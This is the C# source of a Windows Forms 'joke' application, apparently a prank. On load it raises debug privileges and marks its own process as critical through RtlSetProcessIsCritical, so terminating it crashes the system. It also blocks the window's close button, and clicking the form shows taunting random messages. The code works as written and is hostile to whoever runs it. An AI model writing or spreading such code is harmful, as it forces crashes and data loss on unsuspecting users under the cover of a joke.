using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace JokeApp
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll")]
        public static extern void RtlSetProcessIsCritical(bool a, bool b, bool c);
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(true, false, false);
        }

        private readonly int WM_SYSCOMMAND = 0x112;
        private readonly IntPtr SC_CLOSE = (IntPtr)0xF060;
        protected override void WndProc(ref Message msg)
        {
            if (msg.Msg == WM_SYSCOMMAND && msg.WParam == SC_CLOSE)
            {
                new off().ShowDialog();
                return;
            }
            base.WndProc(ref msg);
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            MessageBox.Show(new List<string>() {"啊这，好像什么也没发生","QAQ" ,"啊这，感觉你要完蛋了诶" ,"该怎么办QAQ"}[new Random().Next(0,4)],"qwq");
        }
    }
}
